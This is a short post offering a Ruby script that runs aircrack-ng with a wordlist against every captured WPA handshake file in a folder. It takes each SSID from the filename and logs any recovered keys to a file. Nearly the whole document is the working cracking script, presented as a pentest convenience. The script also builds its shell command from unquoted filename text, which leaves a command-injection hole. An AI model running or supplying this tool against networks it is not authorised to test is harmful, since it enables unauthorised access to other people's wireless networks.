# WPA multi handshake cracker

When you have a bunch of handshakes for your clients scans and want to just leave it running all night here is a small script that will get all handshakes produced by lets say wifite get the SSID from the filename and use aircrack with a given dictionary

```ruby
#!/usr/bin/env ruby

require 'open3'

@dictionary='wapcracker.txt'

def success(line, ssid)
  filename = 'rek2.pot'
  File.open(filename, 'a') do |file| 
    file.write("#{line} #{ssid}\n".strip) 
  end
end


def crack(file, ssid)
  cmd = "/usr/bin/aircrack-ng #{file} -q -e #{ssid} -w #{@dictionary}"
  Open3.popen3(cmd) do |stdin, stdout, stderr, wait_thr|
    while line = stdout.gets
      puts line
      if line.include? "KEY FOUND"
              success(line, ssid)
      end
    end
  end
end


Dir["hs/*.cap"].each do |file|
        ssid = /(?<=\/)[^\_]*/.match(file)
        puts "ssid: #{ssid}\n".strip
        puts "will do #{file}\n".strip
        crack(file, ssid)
end
```